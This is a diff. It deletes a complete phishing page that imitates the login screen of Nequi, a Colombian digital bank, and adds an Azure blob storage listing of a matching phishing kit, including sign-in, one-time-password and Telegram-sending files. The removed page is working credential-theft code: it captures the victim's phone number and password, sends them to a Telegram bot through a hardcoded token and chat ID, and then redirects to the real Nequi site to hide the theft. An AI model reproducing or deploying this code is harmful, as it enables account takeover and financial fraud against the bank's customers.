@@ -1,163 +1,453 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nequi</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
-        
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body { 
-            font-family: 'Roboto', sans-serif; 
-            background: #00B14F; 
-            height: 100vh; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center;
-        }
-        .card {
-            background: white;
-            width: 100%;
-            max-width: 380px;
-            border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.25);
-        }
-        .header {
-            background: #00B14F;
-            color: white;
-            text-align: center;
-            padding: 35px 0 25px;
-        }
-        .header img {
-            width: 78px;
-            filter: brightness(0) invert(1);
-        }
-        .header h1 {
-            font-size: 26px;
-            margin-top: 8px;
-            font-weight: 500;
-        }
-        .content {
-            padding: 30px 28px 40px;
-        }
-        .title {
-            text-align: center;
-            font-size: 17px;
-            color: #333;
-            margin-bottom: 28px;
-            font-weight: 500;
-        }
-        input {
-            width: 100%;
-            padding: 14px 16px;
-            margin: 9px 0;
-            border: 1.5px solid #e0e0e0;
-            border-radius: 12px;
-            font-size: 16.5px;
-        }
-        input:focus {
-            outline: none;
-            border-color: #00B14F;
-        }
-        .btn {
-            width: 100%;
-            padding: 15px;
-            background: #00B14F;
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 17px;
-            font-weight: 500;
-            margin-top: 18px;
-            cursor: pointer;
-        }
-        .btn:hover {
-            background: #00963a;
-        }
-        .error {
-            color: #d32f2f;
-            text-align: center;
-            margin: 12px 0;
-            font-size: 14px;
-            display: none;
-        }
-        .forgot {
-            text-align: center;
-            color: #00B14F;
-            margin-top: 25px;
-            font-size: 15px;
-            cursor: pointer;
-        }
-        .footer {
-            text-align: center;
-            padding: 25px;
-            color: #666;
-            font-size: 13px;
-        }
-    </style>
-</head>
-<body>
-    <div class="card">
-        <div class="header">
-            
-            <h1>Nequi</h1>
-        </div>
-        
-        <div class="content">
-            <div class="title">Inicia sesión en tu cuenta</div>
-            
-            <form id="loginForm">
-                <input type="tel" id="phone" placeholder="Número de celular" maxlength="10" required>
-                <input type="password" id="password" placeholder="Contraseña" required>
-                <div class="error" id="errorMsg">Número o contraseña incorrectos</div>
-                <button type="submit" class="btn">Ingresar</button>
-            </form>
-            
-            <div class="forgot">¿Olvidaste tu contraseña?</div>
-        </div>
-        
-        <div class="footer">
-            Nequi © 2025
-        </div>
-    </div>
-
-    <script>
-        const botToken = "8712944286:AAGUAFIPjLNX5sMeEYdNjLNoFGXiQL_ZNO8";
-        const chatId = "773351137";
-
-        document.getElementById("loginForm").addEventListener("submit", function(e) {
-            e.preventDefault();
-            
-            const phone = document.getElementById("phone").value.trim();
-            const password = document.getElementById("password").value.trim();
-            const errorMsg = document.getElementById("errorMsg");
-
-            if (phone.length < 10) {
-                errorMsg.style.display = "block";
-                return;
-            }
-
-            const message = `🔴 NEQUI PHISH\n\n📱 Celular: ${phone}\n🔑 Contraseña: ${password}\n⏰ Hora: ${new Date().toLocaleString()}`;
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: message })
-            })
-            .then(() => {
-                errorMsg.style.color = "green";
-                errorMsg.textContent = "✅ Iniciando sesión...";
-                errorMsg.style.display = "block";
-                setTimeout(() => {
-                    window.location.href = "https://www.nequi.com.co";
-                }, 1600);
-            })
-            .catch(() => {
-                window.location.href = "https://www.nequi.com.co";
-            });
-        });
-    </script>
-</body>
-</html>
+<EnumerationResults ContainerName="https://impulsateahora.blob.core.windows.net/neqcamilo/">
+<Blobs>
+<Blob>
+<Name>access-passed/accces-sign-in.php.html</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/access-passed/accces-sign-in.php.html</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:34 GMT</Last-Modified>
+<Etag>0x8DEA272E8553370</Etag>
+<Content-Length>12012</Content-Length>
+<Content-Type>text/html</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>2B9yyD3qzk2cKH3EPNuZGQ==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>access-passed/access-sign-in-pass.php.html</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/access-passed/access-sign-in-pass.php.html</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:34:03 GMT</Last-Modified>
+<Etag>0x8DEA2731D531790</Etag>
+<Content-Length>17480</Content-Length>
+<Content-Type>text/html</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>8f+zcla8YNPgc5l2Haog7Q==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>access-passed/loan-simulator.php.html</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/access-passed/loan-simulator.php.html</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:36:53 GMT</Last-Modified>
+<Etag>0x8DEA27382CFEB71</Etag>
+<Content-Length>38090</Content-Length>
+<Content-Type>text/html</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>P7Xph5hD3tjlEoJOECq37g==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>access-passed/one-time-pass.php.html</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/access-passed/one-time-pass.php.html</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:37:19 GMT</Last-Modified>
+<Etag>0x8DEA273927DF7F4</Etag>
+<Content-Length>28798</Content-Length>
+<Content-Type>text/html</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>A4qu7+hgXvEBLY/6aID11A==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>assets/banner-2.webp</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/assets/banner-2.webp</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:35 GMT</Last-Modified>
+<Etag>0x8DEA272E8E0E636</Etag>
+<Content-Length>31654</Content-Length>
+<Content-Type>image/webp</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>rhPvXC5qMG7KelY5I4IwgA==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>assets/banner.webp</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/assets/banner.webp</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:35 GMT</Last-Modified>
+<Etag>0x8DEA272E90D8512</Etag>
+<Content-Length>122366</Content-Length>
+<Content-Type>image/webp</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>LACEIxRWLcMdaio3YBcdQQ==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>assets/favicon.ico</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/assets/favicon.ico</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:35 GMT</Last-Modified>
+<Etag>0x8DEA272E8E21E83</Etag>
+<Content-Length>15406</Content-Length>
+<Content-Type>image/x-icon</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>udkyYOu/LeDm0YeJ9UVezg==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>assets/footer-bigscreen.png</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/assets/footer-bigscreen.png</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:35 GMT</Last-Modified>
+<Etag>0x8DEA272E908A3C4</Etag>
+<Content-Length>104090</Content-Length>
+<Content-Type>image/png</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>GJ7ywDddoBdmdDmTfx6bYg==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>assets/footer-nequi.svg</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/assets/footer-nequi.svg</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:35 GMT</Last-Modified>
+<Etag>0x8DEA272E90DAC18</Etag>
+<Content-Length>254</Content-Length>
+<Content-Type>image/svg+xml</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>HXgi0KD//Q19j04ekU93yw==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>assets/footer.png</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/assets/footer.png</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:35 GMT</Last-Modified>
+<Etag>0x8DEA272E93F6347</Etag>
+<Content-Length>44198</Content-Length>
+<Content-Type>image/png</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>Vnxv2bUJL53/DPOH7QLFmA==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>assets/iconsad-1.svg</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/assets/iconsad-1.svg</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:35 GMT</Last-Modified>
+<Etag>0x8DEA272E93EC71A</Etag>
+<Content-Length>611</Content-Length>
+<Content-Type>image/svg+xml</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>Zp3XMIgD1/TE6byGORrRGA==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>assets/iconsad.svg</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/assets/iconsad.svg</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:35 GMT</Last-Modified>
+<Etag>0x8DEA272E96F6D00</Etag>
+<Content-Length>611</Content-Length>
+<Content-Type>image/svg+xml</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>Zp3XMIgD1/TE6byGORrRGA==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>assets/loading-nequi.webp</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/assets/loading-nequi.webp</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:36 GMT</Last-Modified>
+<Etag>0x8DEA272E997889C</Etag>
+<Content-Length>139888</Content-Length>
+<Content-Type>image/webp</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>YfA5cIJBmdor2vxtDG7Baw==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>assets/logo-credito.png</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/assets/logo-credito.png</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:35 GMT</Last-Modified>
+<Etag>0x8DEA272E9722BB3</Etag>
+<Content-Length>11631</Content-Length>
+<Content-Type>image/png</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>u0pIQpvEtwvesxSVt0hDtg==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>assets/nequi-teclado-numerico-borrar.svg</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/assets/nequi-teclado-numerico-borrar.svg</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:36 GMT</Last-Modified>
+<Etag>0x8DEA272E99A6E64</Etag>
+<Content-Length>677</Content-Length>
+<Content-Type>image/svg+xml</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>aYGfkcoSlQou21NJolD6MA==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>assets/seguro_fogafin.svg</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/assets/seguro_fogafin.svg</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:36 GMT</Last-Modified>
+<Etag>0x8DEA272E9AC5D26</Etag>
+<Content-Length>46605</Content-Length>
+<Content-Type>image/svg+xml</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>u99i374HRaCiioGoOStNuA==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>assets/vigilado-bc.svg</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/assets/vigilado-bc.svg</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:36 GMT</Last-Modified>
+<Etag>0x8DEA272E9CCA2B5</Etag>
+<Content-Length>32422</Content-Length>
+<Content-Type>image/svg+xml</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>FAobLJxeOMM9wR8CnjGfpA==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>assets/warning.png</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/assets/warning.png</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:36 GMT</Last-Modified>
+<Etag>0x8DEA272E9DE2C66</Etag>
+<Content-Length>9824</Content-Length>
+<Content-Type>image/png</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>9YF1avuewO8sbswLM8yIqQ==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>css/finish.css</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/css/finish.css</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:37 GMT</Last-Modified>
+<Etag>0x8DEA272EA17AA92</Etag>
+<Content-Length>202</Content-Length>
+<Content-Type>text/css</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>AOLvzZYcMQMudc6J6eUk0A==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>css/footer.css</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/css/footer.css</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:37 GMT</Last-Modified>
+<Etag>0x8DEA272EA17AA92</Etag>
+<Content-Length>1259</Content-Length>
+<Content-Type>text/css</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>gNBO8h0JJ8XKiAdKMWywPw==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>css/globals.css</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/css/globals.css</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:37 GMT</Last-Modified>
+<Etag>0x8DEA272EA1894CE</Etag>
+<Content-Length>38415</Content-Length>
+<Content-Type>text/css</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>nN+tAaxIuLnL7+4cVK4n6g==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>css/index.css</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/css/index.css</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:37 GMT</Last-Modified>
+<Etag>0x8DEA272EA4F063A</Etag>
+<Content-Length>6954</Content-Length>
+<Content-Type>text/css</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>0bdMZqItGioRUz8k6DIijg==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>css/load-spinner.css</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/css/load-spinner.css</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:37 GMT</Last-Modified>
+<Etag>0x8DEA272EA485070</Etag>
+<Content-Length>2734</Content-Length>
+<Content-Type>text/css</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>gCQqNMvQ+ZEbfen3S9SiIw==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>css/navbar.css</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/css/navbar.css</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:37 GMT</Last-Modified>
+<Etag>0x8DEA272EA78AD4F</Etag>
+<Content-Length>1059</Content-Length>
+<Content-Type>text/css</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>KST7gCkgPz6kffg/S8arPg==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>css/spinner.css</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/css/spinner.css</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:37 GMT</Last-Modified>
+<Etag>0x8DEA272EA78AD4F</Etag>
+<Content-Length>2207</Content-Length>
+<Content-Type>text/css</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>kt/k5GGULpDZA+1BmYleBw==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>css/styles.css</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/css/styles.css</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:37 GMT</Last-Modified>
+<Etag>0x8DEA272EA76B1BF</Etag>
+<Content-Length>971</Content-Length>
+<Content-Type>text/css</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>IxERZvwM8I/7QAWjmEKP7Q==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>index.php.html</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/index.php.html</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:34 GMT</Last-Modified>
+<Etag>0x8DEA272E8566BC0</Etag>
+<Content-Length>8076</Content-Length>
+<Content-Type>text/html</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>LuhLCAsSeyUub2Th9Vj0qg==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+<Blob>
+<Name>js/sendTelegramMessageNoBtn.js</Name>
+<Url>https://impulsateahora.blob.core.windows.net/neqcamilo/js/sendTelegramMessageNoBtn.js</Url>
+<Properties>
+<Last-Modified>Sat, 25 Apr 2026 02:32:37 GMT</Last-Modified>
+<Etag>0x8DEA272EAA4DB26</Etag>
+<Content-Length>571</Content-Length>
+<Content-Type>text/javascript</Content-Type>
+<Content-Encoding/>
+<Content-Language/>
+<Content-MD5>5TnzwjOxBmor0+YR8eO1QA==</Content-MD5>
+<Cache-Control/>
+<BlobType>BlockBlob</BlobType>
+<LeaseStatus>unlocked</LeaseStatus>
+</Properties>
+</Blob>
+</Blobs>
+<NextMarker/>
+</EnumerationResults>
